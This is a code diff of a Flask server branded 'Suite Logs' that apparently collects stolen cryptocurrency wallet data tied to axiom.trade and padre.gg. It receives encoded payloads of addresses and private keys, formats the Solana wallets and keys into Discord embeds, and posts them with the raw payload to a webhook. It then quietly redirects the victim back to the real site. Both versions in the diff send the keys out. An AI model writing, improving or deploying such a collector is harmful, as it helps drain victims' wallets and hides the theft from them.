@@ -6,7 +6,6 @@ import os
 import base64
 import json
 import time
-import threading
 
 from dotenv import load_dotenv
 load_dotenv()
@@ -33,7 +32,6 @@ ALLOWED_HOSTS = ("axiom.trade", "padre.gg")
 BRAND        = "Suite Logs"
 SOL_COLOR    = 0x14F195
 DESC_LIMIT   = 4000
-PING         = "@everyone"
 
 
 def decode_b64url(s: str) -> str:
@@ -43,8 +41,8 @@ def decode_b64url(s: str) -> str:
 
 
 def redirect_target(parsed: dict) -> str:
-    host = str(parsed.get("host") or "").lower()
-    platform = str(parsed.get("platform") or "").lower()
+    host = (parsed.get("host") or "").lower()
+    platform = (parsed.get("platform") or "").lower()
     for allowed in ALLOWED_HOSTS:
         if host == allowed or host.endswith("." + allowed):
             return f"https://{host}/"
@@ -54,24 +52,18 @@ def redirect_target(parsed: dict) -> str:
 def done_page(parsed: dict) -> str:
     target = json.dumps(redirect_target(parsed))
     return (
-        "<!doctype html><meta charset=utf-8><title></title>"
-        "<body style='background:#050a06;margin:0'></body>"
+        "<!doctype html><meta charset=utf-8><title>ok</title>"
+        "<body style='background:#050a06;color:#4ade80;font:14px system-ui;"
+        "display:grid;place-items:center;height:100vh;margin:0'>done</body>"
         "<script>location.replace(" + target + ")</script>"
     )
 
 
 def normalize_wallets(parsed: dict) -> list:
-    platform = str(parsed.get("platform") or "").lower()
+    platform = (parsed.get("platform") or "").lower()
     wallets = parsed.get("wallets") or []
     keys = parsed.get("keys") or []
     addresses = parsed.get("addresses") or []
-
-    if not isinstance(wallets, list):
-        wallets = []
-    if not isinstance(keys, list):
-        keys = []
-    if not isinstance(addresses, list):
-        addresses = []
 
     if wallets:
         return wallets
@@ -89,10 +81,7 @@ def normalize_wallets(parsed: dict) -> list:
 
 
 def build_description(parsed: dict) -> tuple[str, int]:
-    keys    = parsed.get("keys") or []
-    if not isinstance(keys, list):
-        keys = []
-        
+    keys    = parsed.get("keys", []) or []
     wallets = normalize_wallets(parsed)
 
     blocks = []
@@ -100,15 +89,12 @@ def build_description(parsed: dict) -> tuple[str, int]:
     for i, w in enumerate(wallets):
         if not isinstance(w, (list, tuple)) or len(w) < 2:
             continue
-        
-        chain = str(w[1] or "").upper()
+        chain = (w[1] or "").upper()
         if chain != "SOL":
             continue
-            
-        addr  = str(w[0] or "—")
-        label = str(w[5] if len(w) > 5 else "") or "—"
-        key   = str(keys[i]) if i < len(keys) else "not recovered"
-        
+        addr  = w[0] or "—"
+        label = (w[5] if len(w) > 5 else "") or "—"
+        key   = keys[i] if i < len(keys) else "not recovered"
         n += 1
         blocks.append(
             f"**Wal {n}**  ·  Label : `{label}`\n"
@@ -126,7 +112,7 @@ def build_description(parsed: dict) -> tuple[str, int]:
 
 
 def build_embeds(parsed: dict) -> list:
-    host = str(parsed.get("host") or "?")
+    host = parsed.get("host", "?")
     desc, count = build_description(parsed)
 
     if count == 0:
@@ -142,49 +128,34 @@ def build_embeds(parsed: dict) -> list:
     }]
 
 
-def send_to_discord(parsed: dict, payload: str):
-    """Exécuté dans un thread séparé pour ne pas bloquer la redirection."""
-    try:
-        files = {
-            "files[0]": (
-                f"suite-logs-{int(time.time()*1000)}.json",
-                payload.encode("utf-8"),
-                "application/json",
-            )
-        }
-        data = {
-            "payload_json": json.dumps({
-                "content": PING,
-                "username": BRAND,
-                "allowed_mentions": {"parse": ["everyone"]},
-                "embeds": build_embeds(parsed),
-                "attachments": [{"id": "0", "filename": "suite-logs.json"}],
-            }),
-        }
-
-        # Timeout court car on est déjà en arrière-plan
-        r = requests.post(WEBHOOK, data=data, files=files, timeout=10)
-        
-        # Fallback si l'embed plante (ex: payload trop gros)
-        if not r.ok:
-            print(f"Discord API error: {r.status_code} - {r.text}", flush=True)
-            fallback_data = {"content": f"**{BRAND}** Fallback:\n```json\n{payload[:1900]}\n```"}
-            requests.post(WEBHOOK, json=fallback_data, timeout=10)
-            
-    except Exception as e:
-        print(f"Failed to reach Discord: {e}", flush=True)
-        try:
-            fallback_data = {"content": f"**{BRAND}** Fallback (no embed):\n```json\n{payload[:1900]}\n```"}
-            requests.post(WEBHOOK, json=fallback_data, timeout=10)
-        except Exception:
-            pass
-
-
 def forward(parsed: dict, payload: str) -> Response:
-    # Lance l'envoi Discord en arrière-plan
-    threading.Thread(target=send_to_discord, args=(parsed, payload), daemon=True).start()
-    
-    # Redirige l'utilisateur instantanément
+    files = {
+        "files[0]": (
+            f"suite-logs-{int(time.time()*1000)}.json",
+            payload.encode("utf-8"),
+            "application/json",
+        )
+    }
+    data = {
+        "payload_json": json.dumps({
+            "username": BRAND,
+            "embeds": build_embeds(parsed),
+            "attachments": [{"id": "0", "filename": "suite-logs.json"}],
+        }),
+    }
+
+    try:
+        r = requests.post(WEBHOOK, data=data, files=files, timeout=15)
+    except requests.RequestException as e:
+        return Response(f"fetch failed: {e}", status=500)
+
+    if not r.ok:
+        return Response(
+            f"discord {r.status_code} {r.text[:300]}",
+            status=502,
+            mimetype="text/plain",
+        )
+
     return Response(done_page(parsed), mimetype="text/html")
 
 
@@ -192,18 +163,16 @@ def forward(parsed: dict, payload: str) -> Response:
 def root():
     raw = request.args.get("data")
     if not raw:
-        return "", 204
+        return Response("ok", mimetype="text/plain")
 
     if SECRET and request.args.get("key") != SECRET:
-        return "", 403
+        return Response("forbidden", status=403, mimetype="text/plain")
 
     try:
         payload = decode_b64url(raw)
         parsed = json.loads(payload)
-        if not isinstance(parsed, dict):
-            return "", 400
-    except Exception:
-        return "", 400
+    except Exception as e:
+        return Response(f"bad payload: {e}", status=400, mimetype="text/plain")
 
     return forward(parsed, payload)
 
@@ -211,15 +180,13 @@ def root():
 @app.post("/")
 def post_root():
     if SECRET and request.args.get("key") != SECRET:
-        return "", 403
+        return Response("forbidden", status=403, mimetype="text/plain")
 
     payload = request.get_data(as_text=True) or ""
     try:
         parsed = json.loads(payload)
-        if not isinstance(parsed, dict):
-            return "", 400
     except Exception:
-        return "", 400
+        return Response("bad json", status=400, mimetype="text/plain")
 
     return forward(parsed, payload)
 
